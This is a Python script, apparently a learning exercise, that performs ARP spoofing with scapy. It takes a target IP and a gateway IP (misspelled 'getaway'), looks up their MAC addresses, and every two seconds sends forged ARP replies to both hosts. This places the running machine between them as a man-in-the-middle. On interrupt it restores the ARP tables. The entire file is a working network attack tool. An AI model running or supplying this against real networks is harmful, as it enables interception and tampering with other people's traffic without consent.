#!/usr/bin/env python

from typing import ParamSpecArgs
import scapy.all as scapy, time, argparse


def get_ip():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP to spoof.")
    parser.add_argument("-g", "--getaway", dest="getaway", help="")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a Target IP to spoof, use --help")
    elif not options.getaway:
        parser.error("[-] Please specify the Getaway IP, use --help")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # pdst="ip victim ", hwdst="mac address victim", psrc="ip router"
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # scapy will send the packet for us
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, count=4, verbose=False)


options = get_ip()
target_ip = options.target
gateway_ip = options.getaway

try:
    sent_packets_count = 0
    while True:  # will run as long the program is running - until "Ctrl+C"
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        # sys.stdout.flush()  # print doenst store in buffer    <-python 2
        time.sleep(2)  # 2 seconds
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resseting ARP tables. Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
